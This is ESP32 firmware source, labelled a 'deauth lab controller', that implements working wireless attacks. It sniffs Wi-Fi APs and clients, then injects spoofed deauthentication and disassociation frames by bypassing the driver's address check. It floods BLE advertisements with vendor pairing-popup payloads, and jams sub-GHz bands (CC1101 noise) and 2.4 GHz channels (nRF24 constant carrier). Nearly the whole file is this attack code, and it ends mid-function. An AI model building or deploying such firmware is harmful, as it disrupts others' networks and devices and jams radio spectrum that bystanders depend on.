/*
 * ESP32 deauth lab controller — NDJSON @ 921600 over USB-UART bridge.
 * TX is restricted to BSSIDs placed in g_targets by an explicit command.
 * Build: pio run -e esp32dev -t upload
 */

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <ArduinoJson.h>
#include <SPI.h>
#include <RF24.h>
#include <NimBLEDevice.h>
#include <esp_bt.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>

#include <atomic>
#include <cctype>
#include <cstdio>
#include <cstring>

extern "C" esp_err_t esp_wifi_80211_tx_bypass(
    wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

#define FW_VERSION      "1.0.0-jam"
#define SERIAL_BAUD     921600
#define RX_LINE_MAX     1024
#define FRAME_MAX       256
#define RING_LEN        24
#define MAX_APS         48
#define MAX_STAS        64
#define MAX_TARGETS     16

static const uint8_t kBroadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

/* ---- BLE advertising payloads ------------------------------------------ */

static uint8_t bleAirpods[] = {
  0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,
  0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0
};
static uint8_t bleSamsung[] = {
  0x0e,0xff,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xff,0x00,0x00,0x43,0x00
};
static uint8_t bleGoogle[] = {
  0x03,0x03,0x2c,0xfe,0x06,0x16,0x2c,0xfe,0x00,0x00
};
static uint8_t bleSwift[] = {
  0x03,0x03,0x5f,0xfd,0x0a,0xff,0x06,0x00,0x03,0x00,0x80,0x00,0x00,0x00
};
static uint8_t *bleVendorPayloads[] = { bleAirpods, bleSamsung, bleGoogle, bleSwift };
static uint8_t bleVendorLens[] = {
  sizeof(bleAirpods), sizeof(bleSamsung), sizeof(bleGoogle), sizeof(bleSwift)
};
#define BLE_VENDOR_COUNT (sizeof(bleVendorPayloads) / sizeof(bleVendorPayloads[0]))

static uint8_t bleRandomAdv[31];

/* ---- state ------------------------------------------------------------- */

struct Config {
  uint16_t intervalMs  = 5;      // delay antar frame dalam satu burst
  uint16_t burst       = 8;      // frame per burst
  uint16_t burstGapMs  = 30;     // jeda antar burst
  uint8_t  channel     = 6;      // channel TX + sniff
  bool     hop         = false;  // sweep 1..13
  uint16_t hopMs       = 200;    // dwell per channel saat hop
  uint16_t reason      = 7;      // deauth reason code
  bool     broadcast   = true;   // true -> deauth ke broadcast per BSSID
  bool     disassoc    = false;  // true -> subtype disassoc (0xA0)
  uint16_t statsMs     = 2000;   // 0 = matikan status periodik
  uint16_t repeatMs    = 1500;   // kirim ulang AP/client yang sama
  int8_t   rssiMin     = -95;

  // BLE advertising flood
  uint8_t  bleMode       = 1;    // 1 vendor, 2 random, 3 both, 4 custom
  uint16_t bleAdvMs      = 25;
  uint16_t bleBurstGapMs = 10;
  int8_t   blePower      = 9;    // ESP_PWR_LVL_P9

  // Radio: 1=CC1101 subGHz, 2=nRF24 2.4G, 3=dua-duanya
  uint8_t  radioModule = 1;
  uint8_t  ccMode      = 1;      // 1 single freq, 2 sweep band
  float    ccFreq      = 433.92;
  uint8_t  nrfMode     = 1;      // 1 single channel, 2 sweep 0..125
  uint8_t  nrfChannel  = 0;
  uint8_t  pinCcCs     = 5;
  uint8_t  pinNrfCe    = 4;
  uint8_t  pinNrfCs    = 15;
  uint8_t  pinSpiSck   = 18;
  uint8_t  pinSpiMiso  = 19;
  uint8_t  pinSpiMosi  = 23;
};

struct ApEntry {
  bool     used = false;
  uint8_t  bssid[6];
  char     ssid[33];
  uint8_t  ch = 0;
  int8_t   rssi = -127;
  uint8_t  auth = 0;       // 0 open, 1 wep, 2 wpa, 3 wpa2
  bool     hidden = false;
  uint16_t hits = 0;
  uint32_t lastSeen = 0;
  uint32_t lastEmit = 0;
};

struct StaEntry {
  bool     used = false;
  uint8_t  mac[6];
  uint8_t  bssid[6];
  uint8_t  ch = 0;
  int8_t   rssi = -127;
  uint16_t hits = 0;
  uint32_t lastSeen = 0;
  uint32_t lastEmit = 0;
};

struct Target {
  bool used = false;
  uint8_t bssid[6];
};

struct StaTarget {
  bool used = false;
  uint8_t mac[6];
  uint8_t bssid[6];
};

struct RawFrame {
  uint16_t len = 0;
  int8_t   rssi = -127;
  uint8_t  ch = 0;
  uint8_t  kind = 0;       // 1 = AP mgmt, 2 = STA data
  uint8_t  data[FRAME_MAX];
};

static Config   g_cfg;
static ApEntry  g_aps[MAX_APS];
static StaEntry g_stas[MAX_STAS];
static Target   g_targets[MAX_TARGETS];
static StaTarget g_staTargets[MAX_STAS];

static bool     g_jamming = false;
static uint8_t  g_curCh = 6;
static uint32_t g_txCount = 0;
static uint32_t g_txErrors = 0;
static int      g_txLastErr = 0;
static uint32_t g_sendCalls = 0;
static uint32_t g_injectCalls = 0;

static bool     g_bleInited = false;
static bool     g_bleRunning = false;
static bool     g_bleAdvActive = false;
static uint32_t g_bleLast = 0;
static uint32_t g_bleStart = 0;
static uint32_t g_bleSent = 0;
static uint32_t g_bleErrors = 0;
static uint8_t  g_bleCursor = 0;
static uint8_t  g_bleCustom[31] = {0};
static uint8_t  g_bleCustomLen = 0;

static bool     g_radioRunning = false;
static uint32_t g_radioSent = 0;
static uint32_t g_radioErrors = 0;
static bool     g_ccReady = false;
static bool     g_nrfReady = false;
static uint32_t g_radioLast = 0;
static uint16_t g_ccCursor = 0;
static uint8_t  g_nrfCursor = 0;
static RF24   *g_nrf = nullptr;
static uint32_t g_sniffFrames = 0;
static uint32_t g_rxDrops = 0;
static uint32_t g_ringDrops = 0;
static uint16_t s_uniqueAp = 0;
static uint16_t s_uniqueSta = 0;
static uint16_t s_evictAp = 0;
static uint16_t s_evictSta = 0;

/* ---- serial out -------------------------------------------------------- */

static void sendJson(JsonDocument &d) {
  serializeJson(d, Serial);
  Serial.write('\n');
}

static void ack(bool ok, const char *msg, const char *cmd) {
  JsonDocument d;
  d["type"] = "rsp";
  d["ok"]   = ok;
  d["cmd"]  = cmd ? cmd : "";
  d["msg"]  = msg;
  sendJson(d);
}

/* ---- helpers ----------------------------------------------------------- */

static bool macEq(const uint8_t *a, const uint8_t *b) {
  return memcmp(a, b, 6) == 0;
}

static void macToStr(const uint8_t *m, char *out18) {
  snprintf(out18, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
           m[0], m[1], m[2], m[3], m[4], m[5]);
}

static bool parseMac(const char *s, uint8_t out[6]) {
  if (!s || strlen(s) != 17) return false;
  unsigned int m[6];
  if (sscanf(s, "%02x:%02x:%02x:%02x:%02x:%02x",
             &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) != 6) return false;
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)m[i];
  return true;
}

static uint8_t parseHexBytes(const char *s, uint8_t *out, uint8_t maxLen) {
  uint8_t n = 0;
  while (s && *s && n < maxLen) {
    while (*s == ' ' || *s == ':' || *s == '-') s++;
    if (!*s) break;
    if (!isxdigit((unsigned char)s[0]) || !isxdigit((unsigned char)s[1])) return 0;
    char b[3] = { s[0], s[1], 0 };
    out[n++] = (uint8_t)strtoul(b, nullptr, 16);
    s += 2;
  }
  return n;
}

static const char *authStr(uint8_t a) {
  switch (a) {
    case 1: return "wep";
    case 2: return "wpa";
    case 3: return "wpa2";
    default: return "open";
  }
}

/* ---- BLE flood --------------------------------------------------------- */

static void bleInit() {
  static bool done = false;
  if (done) return;
  NimBLEDevice::init("wrecon-ble");
  delay(250);  // tunggu host BLE sync sebelum start advertising
  NimBLEDevice::setPower((esp_power_level_t)g_cfg.blePower, ESP_BLE_PWR_TYPE_ADV);
  NimBLEDevice::getAdvertising()->setMinInterval(0x20);
  NimBLEDevice::getAdvertising()->setMaxInterval(0x20);
  NimBLEDevice::getAdvertising()->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
  g_bleInited = true;
  done = true;
}

static void bleBuildRandom() {
  bleRandomAdv[0] = 0x02; bleRandomAdv[1] = 0x01; bleRandomAdv[2] = 0x06;
  bleRandomAdv[3] = 0x1b; bleRandomAdv[4] = 0xFF;
  bleRandomAdv[5] = esp_random() & 0xFF;
  bleRandomAdv[6] = esp_random() & 0xFF;
  for (int i = 7; i < 31; i++) bleRandomAdv[i] = esp_random() & 0xFF;
}

static void bleEmit(uint8_t *data, uint8_t len) {
  NimBLEAdvertisementData ad;
  ad.addData(reinterpret_cast<char *>(data), len);
  NimBLEDevice::getAdvertising()->setAdvertisementData(ad);
  // NimBLE 1.4.3 mengubah duration*1000; pakai 1 supaya host menerima ~1s.
  // Stop dilakukan sendiri dari bleTick sesuai ble_adv_ms.
  if (!NimBLEDevice::getAdvertising()->start(1, nullptr, nullptr)) {
    g_bleErrors++;
  }
}

static void bleTick() {
  if (!g_bleRunning) return;
  uint32_t now = millis();

  if (g_bleAdvActive) {
    if ((uint32_t)(now - g_bleStart) >= g_cfg.bleAdvMs) {
      NimBLEDevice::getAdvertising()->stop();
      g_bleAdvActive = false;
      g_bleLast = now;
    }
    return;
  }
  if ((uint32_t)(now - g_bleLast) < g_cfg.bleBurstGapMs) return;

  uint8_t *data = bleRandomAdv;
  uint8_t len = sizeof(bleRandomAdv);
  switch (g_cfg.bleMode) {
    case 1:
      data = bleVendorPayloads[g_bleCursor++ % BLE_VENDOR_COUNT];
      len = bleVendorLens[(g_bleCursor - 1) % BLE_VENDOR_COUNT];
      break;
    case 2:
      bleBuildRandom();
      break;
    case 3:
      if (g_bleCursor % 2 == 0) {
        bleBuildRandom();
      } else {
        data = bleVendorPayloads[(g_bleCursor / 2) % BLE_VENDOR_COUNT];
        len = bleVendorLens[(g_bleCursor / 2) % BLE_VENDOR_COUNT];
      }
      g_bleCursor++;
      break;
    case 4:
      if (g_bleCustomLen) { data = g_bleCustom; len = g_bleCustomLen; }
      else { bleBuildRandom(); }
      break;
    default:
      bleBuildRandom();
      break;
  }
  bleEmit(data, len);
  g_bleLast = now;
  g_bleStart = now;
  g_bleAdvActive = true;
  g_bleSent++;
}

/* ---- sub-GHz / 2.4G radio flood ---------------------------------------- */

static const float ccBands[][2] = {
  {315.0f, 316.0f}, {433.0f, 434.99f}, {867.0f, 869.0f}, {902.0f, 928.0f}
};
#define CC_BAND_COUNT (sizeof(ccBands) / sizeof(ccBands[0]))

static uint8_t radioNoise[64];

static bool radioInitCc() {
  ELECHOUSE_cc1101.setSpiPin(g_cfg.pinSpiSck, g_cfg.pinSpiMiso,
                             g_cfg.pinSpiMosi, g_cfg.pinCcCs);
  ELECHOUSE_cc1101.Init();
  if (!ELECHOUSE_cc1101.getCC1101()) return false;
  ELECHOUSE_cc1101.setModulation(2);   // ASK/OOK
  ELECHOUSE_cc1101.setDRate(38.4);
  ELECHOUSE_cc1101.setPA(12);
  ELECHOUSE_cc1101.setMHZ(g_cfg.ccFreq);
  ELECHOUSE_cc1101.SetTx();
  return true;
}

static bool radioInitNrf() {
  SPI.begin(g_cfg.pinSpiSck, g_cfg.pinSpiMiso, g_cfg.pinSpiMosi, g_cfg.pinNrfCs);
  if (g_nrf) delete g_nrf;
  g_nrf = new RF24(g_cfg.pinNrfCe, g_cfg.pinNrfCs);
  if (!g_nrf->begin()) return false;
  g_nrf->setPALevel(RF24_PA_MAX);
  return true;
}

static void radioTick() {
  if (!g_radioRunning) return;
  uint32_t now = millis();
  if ((uint32_t)(now - g_radioLast) < 5) return;
  g_radioLast = now;

  if ((g_cfg.radioModule & 1) && g_ccReady) {
    float f = g_cfg.ccFreq;
    if (g_cfg.ccMode == 2) {
      uint16_t idx = g_ccCursor++;
      uint8_t band = idx % CC_BAND_COUNT;
      uint16_t stepInBand = (idx / CC_BAND_COUNT) % 20;
      f = ccBands[band][0] + stepInBand * 0.1f;
    }
    ELECHOUSE_cc1101.setMHZ(f);
    for (int i = 0; i < (int)sizeof(radioNoise); i++) radioNoise[i] = esp_random() & 0xFF;
    ELECHOUSE_cc1101.SendData(radioNoise, sizeof(radioNoise));
    g_radioSent++;
  }

  if ((g_cfg.radioModule & 2) && g_nrfReady && g_nrf) {
    uint8_t ch = g_cfg.nrfMode == 2
      ? (uint8_t)(g_nrfCursor++ % 126)
      : g_cfg.nrfChannel;
    if (ch > 125) ch = 0;
    g_nrf->startConstCarrier(RF24_PA_MAX, ch);
    g_radioSent++;
  }
}

/* ---- promiscuous ring -------------------------------------------------- */

static RawFrame s_ring[RING_LEN];
static std::atomic<uint16_t> s_head{0};
static std::atomic<uint16_t> s_tail{0};

static void IRAM_ATTR sniffCb(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
  const uint8_t *f = pkt->payload;
  uint8_t kind = 0;

  if (type == WIFI_PKT_MGMT) {
    if (pkt->rx_ctrl.sig_len < 36) return;
    uint8_t sub = (f[0] >> 4) & 0x0F;
    if (sub != 0x08 && sub != 0x05) return;   // beacon / probe response
    kind = 1;
  } else if (type == WIFI_PKT_DATA) {
    if (pkt->rx_ctrl.sig_len < 24) return;
    bool toDS = (f[0] & 0x08) != 0;
    bool fromDS = (f[0] & 0x04) != 0;
    if (toDS == fromDS) return;               // ad-hoc / WDS, lewati
    kind = 2;
  } else {
    return;
  }

  uint16_t h = s_head.load(std::memory_order_relaxed);
  uint16_t next = (uint16_t)((h + 1) % RING_LEN);
  if (next == s_tail.load(std::memory_order_acquire)) {
    g_ringDrops++;
    return;
  }

  RawFrame &r = s_ring[h];
  uint16_t n = pkt->rx_ctrl.sig_len;
  if (n > FRAME_MAX) n = FRAME_MAX;
  r.len  = n;
  r.rssi = pkt->rx_ctrl.rssi;
  r.ch   = pkt->rx_ctrl.channel ? pkt->rx_ctrl.channel : g_curCh;
  r.kind = kind;
  memcpy(r.data, f, n);
  s_head.store(next, std::memory_order_release);
  g_sniffFrames++;
}

/* ---- parse AP beacon --------------------------------------------------- */

static void processAp(const RawFrame &r) {
  if (r.len < 36) return;
  const uint8_t *f = r.data;
  const uint8_t *bssid = f + 16;
  uint16_t capab = (uint16_t)f[34] | ((uint16_t)f[35] << 8);
  bool privacy = (capab & 0x0010) != 0;

  char ssid[33] = {0};
  uint8_t ssidLen = 0;
  uint8_t ch = r.ch;
  bool rsn = false, wpa = false;

  uint16_t i = 36;
  while ((uint16_t)(i + 2) <= r.len) {
    uint8_t id = f[i];
    uint8_t l  = f[i + 1];
    if ((uint16_t)(i + 2 + l) > r.len) break;
    const uint8_t *v = f + i + 2;
    if (id == 0 && l <= 32) {
      ssidLen = l;
      memcpy(ssid, v, l);
      ssid[l] = 0;
    } else if (id == 3 && l >= 1) {
      ch = v[0];
    } else if (id == 48) {
      rsn = true;
    } else if (id == 221 && l >= 4 && v[0] == 0x00 && v[1] == 0x50 &&
               v[2] == 0xF2 && v[3] == 0x01) {
      wpa = true;
    }
    i += (uint16_t)(2 + l);
  }

  if (r.rssi < g_cfg.rssiMin) return;
  uint8_t auth = privacy ? (uint8_t)(rsn ? 3 : (wpa ? 2 : 1)) : 0;

  ApEntry *e = nullptr;
  ApEntry *freeSlot = nullptr;
  for (uint16_t k = 0; k < MAX_APS; k++) {
    if (!g_aps[k].used) { if (!freeSlot) freeSlot = &g_aps[k]; continue; }
    if (macEq(g_aps[k].bssid, bssid)) { e = &g_aps[k]; break; }
  }
  bool isNew = false;
  if (!e) {
    e = freeSlot ? freeSlot : &g_aps[s_evictAp++ % MAX_APS];
    *e = ApEntry();
    e->used = true;
    memcpy(e->bssid, bssid, 6);
    e->rssi = -127;
    isNew = true;
    s_uniqueAp++;
  }

  uint32_t now = millis();
  int8_t oldRssi = e->rssi;
  e->hits++;
  e->lastSeen = now;
  e->ch = ch;
  e->rssi = r.rssi;
  e->auth = auth;
  e->hidden = (ssidLen == 0);
  if (ssidLen) memcpy(e->ssid, ssid, ssidLen + 1); else e->ssid[0] = 0;

  bool due = g_cfg.repeatMs && (uint32_t)(now - e->lastEmit) >= g_cfg.repeatMs;
  bool moved = abs((int)r.rssi - (int)oldRssi) >= 6;
  if (!isNew && !due && !moved) return;
  e->lastEmit = now;

  char mac[18];
  macToStr(e->bssid, mac);
  JsonDocument d;
  d["type"]  = "wifi";
  d["ts"]    = now;
  d["bssid"] = mac;
  if (!e->hidden) d["ssid"] = e->ssid;
  d["hidden"] = e->hidden;
  d["ch"]     = e->ch;
  d["rssi"]   = e->rssi;
  d["auth"]   = authStr(e->auth);
  d["hits"]   = e->hits;
  sendJson(d);
}

/* ---- parse STA data frame --------------------------------------------- */

static void processSta(const RawFrame &r) {
  if (r.len < 24) return;
  const uint8_t *f = r.data;
  bool toDS = (f[0] & 0x08) != 0;
  bool fromDS = (f[0] & 0x04) != 0;
  const uint8_t *sta, *bssid;
  if (toDS && !fromDS) {
    bssid = f + 4;
    sta   = f + 10;
  } else if (fromDS && !toDS) {
    sta   = f + 4;
    bssid = f + 10;
  } else {
    return;
  }

  bool zeroSta = true;
  for (int i = 0; i < 6; i++) if (sta[i]) { zeroSta = false; break; }
  if (zeroSta) return;

  StaEntry *e = nullptr;
  StaEntry *freeSlot = nullptr;
  for (uint16_t k = 0; k < MAX_STAS; k++) {
    if (!g_stas[k].used) { if (!freeSlot) freeSlot = &g_stas[k]; continue; }
    if (macEq(g_stas[k].mac, sta) && macEq(g_stas[k].bssid, bssid)) {
      e = &g_stas[k];
      break;
    }
  }
  bool isNew = false;
  if (!e) {
    e = freeSlot ? freeSlot : &g_stas[s_evictSta++ % MAX_STAS];
    *e = StaEntry();
    e->used = true;
    memcpy(e->mac, sta, 6);
    memcpy(e->bssid, bssid, 6);
    e->rssi = -127;
    isNew = true;
    s_uniqueSta++;
  }

  uint32_t now = millis();
  int8_t oldRssi = e->rssi;
  e->hits++;
  e->lastSeen = now;
  e->ch = r.ch;
  e->rssi = r.rssi;
  bool due = g_cfg.repeatMs && (uint32_t)(now - e->lastEmit) >= g_cfg.repeatMs;
  bool moved = abs((int)r.rssi - (int)oldRssi) >= 6;
  if (!isNew && !due && !moved) return;
  e->lastEmit = now;

  char mac[18], ap[18];
  macToStr(e->mac, mac);
  macToStr(e->bssid, ap);
  JsonDocument d;
  d["type"]  = "client";
  d["ts"]    = now;
  d["addr"]  = mac;
  d["bssid"] = ap;
  d["ch"]    = e->ch;
  d["rssi"]  = e->rssi;
  d["hits"]  = e->hits;
  sendJson(d);
}

/* ---- target maintenance ------------------------------------------------ */

static void clearTargets() {
  for (uint16_t i = 0; i < MAX_TARGETS; i++) g_targets[i] = Target();
  for (uint16_t i = 0; i < MAX_STAS; i++) g_staTargets[i] = StaTarget();
}

static uint16_t setTargetsFromJson(JsonArray arr) {
  clearTargets();
  uint16_t n = 0;
  for (size_t k = 0; k < arr.size() && n < MAX_TARGETS; k++) {
    const char *s = arr[k] | "";
    uint8_t m[6];
    if (!parseMac(s, m)) continue;
    bool dup = false;
    for (uint16_t i = 0; i < n; i++) if (macEq(g_targets[i].bssid, m)) { dup = true; break; }
    if (dup) continue;
    g_targets[n].used = true;
    memcpy(g_targets[n].bssid, m, 6);
    n++;
  }
  return n;
}

static uint16_t setStaTargetsFromJson(JsonArray arr) {
  for (uint16_t i = 0; i < MAX_STAS; i++) g_staTargets[i] = StaTarget();
  uint16_t n = 0;
  for (size_t k = 0; k < arr.size() && n < MAX_STAS; k++) {
    const char *s = arr[k] | "";
    uint8_t m[6];
    if (!parseMac(s, m)) continue;

    uint8_t bssid[6] = {0};
    for (uint16_t j = 0; j < MAX_STAS; j++) {
      if (g_stas[j].used && macEq(g_stas[j].mac, m)) {
        memcpy(bssid, g_stas[j].bssid, 6);
        break;
      }
    }
    if (!bssid[0] && !bssid[1] && !bssid[2] &&
        !bssid[3] && !bssid[4] && !bssid[5]) continue;  // client belum terlihat

    bool dup = false;
    for (uint16_t i = 0; i < n; i++) if (macEq(g_staTargets[i].mac, m)) { dup = true; break; }
    if (dup) continue;
    g_staTargets[n].used = true;
    memcpy(g_staTargets[n].mac, m, 6);
    memcpy(g_staTargets[n].bssid, bssid, 6);
    n++;
  }
  return n;
}

/* ---- TX ---------------------------------------------------------------- */

static void injectFrame(const uint8_t *bssid, const uint8_t *sta) {
  g_injectCalls++;
  uint8_t frame[26];
  frame[0] = g_cfg.disassoc ? 0xA0 : 0xC0;   // mgmt subtype: deauth / disassoc
  frame[1] = 0x00;
  frame[2] = 0x00;
  frame[3] = 0x00;
  memcpy(frame + 4,  sta,   6);               // addr1: receiver
  memcpy(frame + 10, bssid, 6);               // addr2: transmitter (spoof AP)
  memcpy(frame + 16, bssid, 6);               // addr3: BSSID
  frame[22] = 0x00;
  frame[23] = 0x00;
  frame[24] = (uint8_t)(g_cfg.reason & 0xFF);
  frame[25] = (uint8_t)((g_cfg.reason >> 8) & 0xFF);

  // Lewati check addr2 di driver supaya spoof BSSID benar-benar keluar.
  esp_err_t err = esp_wifi_80211_tx_bypass(WIFI_IF_STA, frame, sizeof(frame), false);
  if (err == ESP_OK) {
    g_txCount++;
  } else {
    g_txErrors++;
    g_txLastErr = (int)err;
  }
}

static uint16_t s_burstLeft = 0;
static uint32_t s_lastFrame = 0;
static uint32_t s_lastBurst = 0;
static uint16_t s_tCursor = 0;
static uint16_t s_cCursor = 0;

static void sendNext() {
  g_sendCalls++;
  uint16_t active = 0;
  for (uint16_t i = 0; i < MAX_TARGETS; i++) if (g_targets[i].used) active++;
  if (!active) return;

  if (!g_cfg.broadcast) {
    uint16_t cActive = 0;
    for (uint16_t i = 0; i < MAX_STAS; i++) if (g_staTargets[i].used) cActive++;
    if (cActive) {
      for (uint16_t n = 0; n < MAX_STAS; n++) {
        s_cCursor = (uint16_t)((s_cCursor + 1) % MAX_STAS);
        if (!g_staTargets[s_cCursor].used) continue;
        injectFrame(g_staTargets[s_cCursor].bssid, g_staTargets[s_cCursor].mac);
        return;
      }
    }
  }

  for (uint16_t n = 0; n < MAX_TARGETS; n++) {
    s_tCursor = (uint16_t)((s_tCursor + 1) % MAX_TARGETS);
    if (!g_targets[s_tCursor].used) continue;
    injectFrame(g_targets[s_tCursor].bssid, kBroadcast);
    return;
  }
}

static void jamTick() {
  if (!g_jamming) return;
  uint32_t now = millis();

  if (s_burstLeft == 0 && (uint32_t)(now - s_lastBurst) >= g_cfg.burstGapMs) {
    s_burstLeft = g_cfg.burst;
    s_lastBurst = now;
  }
  if (s_burstLeft == 0) return;
  if ((uint32_t)(now - s_lastFrame) < g_cfg.intervalMs) return;
  s_lastFrame = now;
  s_burstLeft--;
  sendNext();
}

/* ---- channel hop ------------------------------------------------------- */

static uint32_t s_lastHop = 0;
static uint8_t  s_hopCursor = 0;

static void hopTick() {
  uint32_t now = millis();
  if (g_cfg.hop) {
    uint16_t dwell = g_cfg.hopMs ? g_cfg.hopMs : 100;
    if (s_lastHop && (uint32_t)(now - s_lastHop) < dwell) return;
    s_lastHop = now;
    uint8_t c = (uint8_t)((s_hopCursor % 13) + 1);
    s_hopCursor = (uint8_t)(c % 13);
    if (c != g_curCh && esp_wifi_set_channel(c, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
      g_curCh = c;
    }
  } else if (g_curCh != g_cfg.channel) {
    if (esp_wifi_set_channel(g_cfg.channel, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
      g_curCh = g_cfg.channel;
    }
  }
}

/* ---- status / config events ------------------------------------------- */

static void emitConfig() {
  JsonDocument d;
  d["type"] = "config";
  JsonObject p = d["params"].to<JsonObject>();
  p["interval_ms"]  = g_cfg.intervalMs;
  p["burst"]        = g_cfg.burst;
  p["burst_gap_ms"] = g_cfg.burstGapMs;
  p["channel"]      = g_cfg.channel;
  p["hop"]          = g_cfg.hop;
  p["hop_ms"]       = g_cfg.hopMs;
  p["reason"]       = g_cfg.reason;
  p["broadcast"]    = g_cfg.broadcast;
  p["disassoc"]     = g_cfg.disassoc;
  p["stats_ms"]     = g_cfg.statsMs;
  p["repeat_ms"]    = g_cfg.repeatMs;
  p["rssi_min"]     = g_cfg.rssiMin;
  p["ble_mode"]     = g_cfg.bleMode;
  p["ble_adv_ms"]   = g_cfg.bleAdvMs;
  p["ble_burst_gap_ms"] = g_cfg.bleBurstGapMs;
  p["ble_power"]    = g_cfg.blePower;
  p["radio_module"] = g_cfg.radioModule;
  p["cc_mode"]      = g_cfg.ccMode;
  p["cc_freq"]      = g_cfg.ccFreq;
  p["nrf_mode"]     = g_cfg.nrfMode;
  p["nrf_channel"]  = g_cfg.nrfChannel;
  p["pin_cc_cs"]    = g_cfg.pinCcCs;
  p["pin_nrf_ce"]   = g_cfg.pinNrfCe;
  p["pin_nrf_cs"]   = g_cfg.pinNrfCs;
  p["pin_spi_sck"]  = g_cfg.pinSpiSck;
  p["pin_spi_miso"] = g_cfg.pinSpiMiso;
  p["pin_spi_mosi"] = g_cfg.pinSpiMosi;

  JsonArray t = d["targets"].to<JsonArray>();
  for (uint16_t i = 0; i < MAX_TARGETS; i++) {
    if (!g_targets[i].used) continue;
    char mac[18];
    macToStr(g_targets[i].bssid, mac);
    t.add(mac);
  }
  JsonArray c = d["client_targets"].to<JsonArray>();
  for (uint16_t i = 0; i < MAX_STAS; i++) {
    if (!g_staTargets[i].used) continue;
    char mac[18];
    macToStr(g_staTargets[i].mac, mac);
    c.add(mac);
  }
  d["jamming"] = g_jamming;
  sendJson(d);
}

static void emitStatus() {
  JsonDocument d;
  d["type"]    = "status";
  d["ts"]      = millis();
  d["jamming"] = g_jamming;
  d["channel"] = g_curCh;

  JsonObject s = d["stats"].to<JsonObject>();
  s["frames"]      = g_sniffFrames;
  s["aps"]         = s_uniqueAp;
  s["clients"]     = s_uniqueSta;
  s["tx"]          = g_txCount;
  s["tx_errors"]   = g_txErrors;
  s["tx_last_err"] = g_txLastErr;
  s["send_calls"]  = g_sendCalls;
  s["inject_calls"] = g_injectCalls;
  s["burst_left"]  = s_burstLeft;
  s["rx_dropped"]  = g_rxDrops;
  s["ring_dropped"] = g_ringDrops;

  JsonObject ble = d["ble"].to<JsonObject>();
  ble["running"] = g_bleRunning;
  ble["sent"]    = g_bleSent;
  ble["errors"]  = g_bleErrors;

  JsonObject radio = d["radio"].to<JsonObject>();
  radio["running"] = g_radioRunning;
  radio["sent"]    = g_radioSent;
  radio["cc_ready"] = g_ccReady;
  radio["nrf_ready"] = g_nrfReady;

  uint16_t targets = 0;
  for (uint16_t i = 0; i < MAX_TARGETS; i++) if (g_targets[i].used) targets++;
  d["targets"] = targets;
  sendJson(d);
}

/* ---- command parsing --------------------------------------------------- */

static JsonDocument s_rx;

static bool getInt(JsonObject p, const char *key, long lo, long hi, long *out) {
  JsonVariant v = p[key];
  if (!v.is<long>()) return false;
  long x = v.as<long>();
  if (x < lo || x > hi) return false;
  *out = x;
  return true;
}

static bool getFloat(JsonObject p, const char *key, float lo, float hi, float *out) {
  JsonVariant v = p[key];
  if (!v.is<float>() && !v.is<double>()) return false;
  float x = v.as<float>();
  if (x < lo || x > hi) return false;
  *out = x;
  return true;
}

static bool getBool(JsonObject p, const char *key, bool *out) {
  JsonVariant v = p[key];
  if (!v.is<bool>()) return false;
  *out = v.as<bool>();
  return true;
}

static void applyParams(JsonObject p) {
  long x;
  bool y;
  bool changed = false;

  if (getInt(p, "interval_ms", 1, 1000, &x)) {
    g_cfg.intervalMs = (uint16_t)x; changed = true;
  }
  if (getInt(p, "burst", 1, 100, &x)) {
    g_cfg.burst = (uint16_t)x; changed = true;
  }
  if (getInt(p, "burst_gap_ms", 0, 5000, &x)) {
    g_cfg.burstGapMs = (uint16_t)x; changed = true;
  }
  if (getInt(p, "channel", 1, 13, &x)) {
    g_cfg.channel = (uint8_t)x; changed = true;
  }
  if (getBool(p, "hop", &y)) { g_cfg.hop = y; changed = true; }
  if (getInt(p, "hop_ms", 10, 5000, &x)) {
    g_cfg.hopMs = (uint16_t)x; changed = true;
  }
  if (getInt(p, "reason", 1, 25, &x)) {
    g_cfg.reason = (uint16_t)x; changed = true;
  }
  if (getBool(p, "broadcast", &y)) { g_cfg.broadcast = y; changed = true; }
  if (getBool(p, "disassoc", &y)) { g_cfg.disassoc = y; changed = true; }
  if (getInt(p, "stats_ms", 0, 60000, &x)) {
    g_cfg.statsMs = (uint16_t)x; changed = true;
  }
  if (getInt(p, "repeat_ms", 0, 600000, &x)) {
    g_cfg.repeatMs = (uint16_t)x; changed = true;
  }
  if (getInt(p, "rssi_min", -120, 0, &x)) {
    g_cfg.rssiMin = (int8_t)x; changed = true;
  }
  if (getInt(p, "ble_mode", 1, 4, &x)) { g_cfg.bleMode = (uint8_t)x; changed = true; }
  if (getInt(p, "ble_adv_ms", 5, 1000, &x)) { g_cfg.bleAdvMs = (uint16_t)x; changed = true; }
  if (getInt(p, "ble_burst_gap_ms", 0, 5000, &x)) { g_cfg.bleBurstGapMs = (uint16_t)x; changed = true; }
  if (getInt(p, "ble_power", 0, 9, &x)) { g_cfg.blePower = (int8_t)x; changed = true; }
  if (getInt(p, "radio_module", 0, 3, &x)) { g_cfg.radioModule = (uint8_t)x; changed = true; }
  if (getInt(p, "cc_mode", 1, 2, &x)) { g_cfg.ccMode = (uint8_t)x; changed = true; }
  float f;
  if (getFloat(p, "cc_freq", 300.0f, 930.0f, &f)) { g_cfg.ccFreq = f; changed = true; }
  if (getInt(p, "nrf_mode", 1, 2, &x)) { g_cfg.nrfMode = (uint8_t)x; changed = true; }
  if (getInt(p, "nrf_channel", 0, 125, &x)) { g_cfg.nrfChannel = (uint8_t)x; changed = true; }
  if (getInt(p, "pin_cc_cs", 0, 34, &x)) { g_cfg.pinCcCs = (uint8_t)x; changed = true; }
  if (getInt(p, "pin_nrf_ce", 0, 34, &x)) { g_cfg.pinNrfCe = (uint8_t)x; changed = true; }
